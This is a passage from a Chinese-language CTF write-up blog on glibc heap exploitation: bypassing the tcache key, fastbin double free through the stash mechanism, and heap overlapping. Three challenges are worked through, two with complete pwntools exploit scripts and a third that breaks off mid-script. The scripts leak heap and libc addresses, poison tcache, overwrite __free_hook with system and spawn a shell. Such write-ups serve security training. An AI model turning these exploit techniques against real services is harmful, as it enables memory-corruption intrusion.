<p>在这种情况下，我们在进行 tcache double free 之前，还需要想办法绕过 tcache key 的保护，但好处是<strong>我们可以通过tcache key直接泄露堆基址</strong></p>
<p>CTF中涉及 tcache key 的题目中通常都会提供有清除该key的方法，若没有也可以在填满tcache后重新回归fastbin的利用</p>
<p>常见的 tcache key bypass 手段如下：</p>
<ul>
<li><strong>清除 tcache key</strong>：通过一些对于垂悬指针的利用手段将该 free chunk 中记录的 tcache key清除，从而绕过该检测</li>
<li><strong>tcache stash with fastbin double free</strong>：在 fastbin 中并没有严密的 double free 检测，我们可以在填满对应的 tcache 链条后<strong>在 fastbin 中完成 double free，随后通过 stash 机制将 fastbin 中 chunk 倒回 tcache 中</strong></li>
</ul>
<h5 id="例题1（清除tcache-key）：bytectf2020-final-awd-day1-diary"><a href="#例题1（清除tcache-key）：bytectf2020-final-awd-day1-diary" class="headerlink" title="例题1（清除tcache key）：bytectf2020 - final - awd day1 - diary"></a>例题1（清除tcache key）：bytectf2020 - final - awd day1 - diary</h5><p><a href="/download/bytectf2020/final/awd/day1/diary/diary" title="点击此处下载原题">点击下载-diary</a></p>
<p>大概是以下几个点：</p>
<ul>
<li>delete堆块的时候没有置零存在UAF，重新edit可以清除tcache key绕过检测</li>
<li>edit时会输出堆块大小，也就是输出FD，FD指针用来存储堆块大小，可以泄露堆地址和 libc 基址</li>
<li>由于犯了以chunk的FD指针来判断堆块大小的逻辑错误判断，于是delete后再edit可以进行堆块溢出</li>
<li>修改__free_hook为system以后释放一个内容为”&#x2F;bin&#x2F;sh”的块即可get shell</li>
</ul>
<p>笔者在比赛中踩坑的点：</p>
<ul>
<li>由于FD用于储存堆块大小，利用edit泄露main_arena的时候会破坏BK，需要手动将main_arena + 96输回去</li>
<li>同上，由于输入都是从BK开始，故需要堆溢出改一个chunk的FD为”&#x2F;bin&#x2F;sh”</li>
</ul>
<p>笔者在比赛时写的exp如下：（稍微有一丶乱…）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./diary&#x27;</span>)<span class="comment">#remote(&#x27;&#x27;, 5021)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./diary&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>) <span class="comment"># test locally</span></span><br><span class="line">one_gadget = <span class="number">0xe6e73</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Options&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">name, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;bytes:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">name</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="string">&#x27;arttnba1&#x27;</span>, <span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    new(<span class="string">&#x27;arttnba0&#x27;</span>, <span class="number">0x10</span>, <span class="string">&#x27;arttnba0&#x27;</span>)</span><br><span class="line">    new(<span class="string">&#x27;arttnba2&#x27;</span>, <span class="number">0x20</span>, <span class="string">&#x27;arttnba2&#x27;</span>)</span><br><span class="line">    new(<span class="string">&#x27;shell&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">    new(<span class="string">&#x27;sheep&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;sheep&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        free(<span class="string">&#x27;arttnba0&#x27;</span>)</span><br><span class="line">        edit(<span class="string">&#x27;arttnba0&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># clear the tcache key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        free(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">        edit(<span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        free(<span class="string">&#x27;arttnba2&#x27;</span>)</span><br><span class="line">        edit(<span class="string">&#x27;arttnba2&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap addr</span></span><br><span class="line">    free(<span class="string">&#x27;arttnba2&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;arttnba2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input&quot;</span>)</span><br><span class="line">    heap_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;bytes&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    new(<span class="string">&#x27;arttnba3&#x27;</span>, <span class="number">0x90</span>, <span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line">        edit(<span class="string">&#x27;arttnba3&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc</span></span><br><span class="line">    free(<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input&quot;</span>)</span><br><span class="line">    main_arena = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;bytes&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - <span class="number">96</span></span><br><span class="line">    p.sendline(p64(main_arena + <span class="number">96</span>)) <span class="comment"># fix the heap</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    edit(<span class="string">&#x27;arttnba0&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x8</span> + <span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0</span> + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>) * <span class="number">3</span>)</span><br><span class="line">    new(<span class="string">&#x27;arttnba7&#x27;</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">    new(<span class="string">&#x27;freehook&#x27;</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#p.interactive()</span></span><br><span class="line">    edit(<span class="string">&#x27;shell&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x8</span> + <span class="number">0x20</span> + <span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">10</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    free(<span class="string">&#x27;sheep&#x27;</span>) <span class="comment"># system(&quot;/bin/sh&quot;)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<h5 id="例题2（fastbin-double-free）：ciscn-2019-final-3"><a href="#例题2（fastbin-double-free）：ciscn-2019-final-3" class="headerlink" title="例题2（fastbin double free）：ciscn_2019_final_3"></a>例题2（fastbin double free）：ciscn_2019_final_3</h5><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/04/04/KIZF84yhjVTaSAE.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接就有一个裸的 UAF</p>
<p><img src="https://i.loli.net/2021/04/04/6woiXGIQdv95Dgt.png" alt="image.png"></p>
<p>唯一的输出功能是在每次分配之后会给出 chunk 的地址，利用这个我们可以泄露 <code>堆基址</code>，而我们后续若是能够分配到一个位于 libc 中的 chunk ，则毫无疑问也能泄露 libc 基址</p>
<p><img src="https://i.loli.net/2021/04/05/mXUwpYVoHSFWB3G.png" alt="image.png"></p>
<p>同时题目限制了只能分配 <code>0x78</code> 以下的 chunk ，我们没法直接获得一个 unsorted bin chunk</p>
<p><img src="https://i.loli.net/2021/04/05/4efPFN6QT1Rj7Kc.png" alt="image.png"></p>
<p>题目给出的 libc 为<code>没有 double free 检测的 2.27 版本</code>，但是笔者个人觉得既然往后的新版本 libc 的 tcache 都有 double free 检测，现在这里主动忽视掉这一点等于是自欺欺人（），于是笔者选择<strong>通过 stash 机制绕过 double free 检测的做法</strong></p>
<blockquote>
<p>主动提高题目难度的屑人</p>
</blockquote>
<p>由于题目仅仅允许分配 <code>0x18</code> 次 chunk，而利用 stash 绕过 double free 检测至少需要使用其中的 <code>19</code> 次，第 <code>20</code> 次才是我们的第一次任意地址写，因此我们需要精确计算利用好剩下的 <code>4</code> 次机会</p>
<p>那么在这里笔者选择劫持 tcache struct ：</p>
<ul>
<li>tcache struct 大小为 0x250（libc 2.27），free刚好可以放入 unsorted bin</li>
<li>可以直接控制对应下标的 count ，而不需要想办法分配大于 0x400 的 chunk 以略过 tcache</li>
<li>可以直接控制对应下标存放的 chunk</li>
</ul>
<p>我们控制 tcache struct 之后直接在合适下标内 <strong>再写入 tcache 地址，二次分配后我们便能够分配到一个 libc 中的 chunk，以此泄露 libc 基址</strong></p>
<p>最后就是改 <code>__free_hook</code> 为 <code>system</code> 的常规流程，由于 chunk 数量限制，我们需要多次控制 tcache struct</p>
<p>最终的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26084</span>) <span class="comment">#process(&#x27;./ciscn_final_3&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>,size:<span class="built_in">int</span> , content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input the index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input the size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;now you can write something&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input the index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;gift :&quot;</span>)</span><br><span class="line">    heap_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;heap addr leak: &#x27;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x11e70</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        new(i, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">17</span>):</span><br><span class="line">        new(i, <span class="number">0x70</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    new(<span class="number">17</span>, <span class="number">0x70</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">18</span>, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">19</span>, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">20</span>, <span class="number">0x70</span>, (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">35</span> + <span class="string">b&#x27;\x07&#x27;</span> * <span class="number">1</span>).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base + <span class="number">0x10</span>) * <span class="number">6</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    new(<span class="number">21</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">22</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;gift :&quot;</span>)</span><br><span class="line">    libc_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;libc addr leak: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">23</span>, <span class="number">0x50</span>, (<span class="string">b&#x27;\x01&#x27;</span> * <span class="number">10</span>).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) * <span class="number">2</span>)</span><br><span class="line">    new(<span class="number">24</span>, <span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/05/vA7IVD4GBjLYhcp.png" alt="image.png"></p>
<h2 id="三、堆重叠（Heap-Overlapping）"><a href="#三、堆重叠（Heap-Overlapping）" class="headerlink" title="三、堆重叠（Heap Overlapping）"></a>三、堆重叠（Heap Overlapping）</h2><p>堆块重叠即我们<strong>同时拥有两个或以上的下标指向同一个 chunk</strong>（同一个地址），在这样的情况下便可以手动实现 double free 、地址泄露（例如释放一个下标后通过另一个下标打印 chunk 内容从而获得<strong>堆&#x2F;libc</strong>相关地址）等各种利用，十分方便</p>
<h4 id="例题：-CTF2021-babyheap-Use-After-Free-tcache-poisoning"><a href="#例题：-CTF2021-babyheap-Use-After-Free-tcache-poisoning" class="headerlink" title="例题：*CTF2021 - babyheap - Use After Free + tcache poisoning"></a>例题：*CTF2021 - babyheap - Use After Free + tcache poisoning</h4><blockquote>
<p> 比较白给的签到题</p>
</blockquote>
<p><a href="/download/starCTF2021/pwn/babyheap.zip" title="点击此处下载原题">点击下载-babyheap.zip</a></p>
<p>惯例的checksec，保护全开（<del>基本上大比赛题目都是默认保护全开的</del></p>
<p><img src="https://i.loli.net/2021/01/20/dNUGu8zEfwtoyn1.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/01/20/Y5btDgrNvsm8j1T.png" alt="image.png"></p>
<p>程序本身有着<strong>分配、删除、修改、打印堆块内容</strong>的功能，<del>给的面面俱到，十分白给</del></p>
<p>漏洞点在于<code>delete()</code>函数中free后没有将指针置NULL，<strong>存在 Use After Free漏洞</strong></p>
<p><img src="https://i.loli.net/2021/01/20/ZEwbcnI3X7J2Y8R.png" alt="image.png"></p>
<p>在<code>add()</code>函数中我们有着16个可用的下标，且分配时会直接覆写原指针，因此我们几乎是可以分配任意个chunk，但是<strong>只允许我们分配fastbin size范围的chunk</strong></p>
<p><img src="https://i.loli.net/2021/01/20/UEeKDiZ3hlbXBn9.png" alt="image.png"></p>
<p>因此若想要泄露libc地址我们需要借助<code>malloc_consolidate()</code>将chunk送入small bins中</p>
<p>注意到<code>leaveYourName()</code>函数中会调用 malloc() 分配一个大chunk，因此我们可以通过调用该函数触发<code>malloc_consolidate()</code>，将 fastbin 中 chunk 送入 smallbin， 以泄露libc基址</p>
<p><img src="https://i.loli.net/2021/01/20/rH6nglJkI9Ne4WO.png" alt="~D9_XAV_4G5_FGKSMTED_13.png"></p>
<p>gdb调试我们可以得知该地址与main_arena间距336，因而我们便可以得到libc基址</p>
<p><img src="https://i.loli.net/2021/01/20/CfJBNzhRyul5jAm.png" alt="image.png"></p>
<p><strong>将这个 small bin 再分配回来我们就能够实现 chunk overlapping 了，继而就是通过程序的 edit 功能实现 tcache poisoning 修改 __free_hook 为 system() 后 free 一个内容为 “&#x2F;bin&#x2F;sh” 的 chunk 即可 get shell</strong></p>
<p>需要注意的是<code>edit()</code>函数中是<strong>从 bk 的位置开始输入</strong>的，因而我们的 fake chunk 需要构造到<code>__free_hook - 8 </code>的位置</p>
<p><img src="https://i.loli.net/2021/01/20/uBnYrSZptINMikh.png" alt="image.png"></p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>) <span class="comment"># p = remote(&#x27;52.152.231.198&#x27;, 8081)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input content&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span 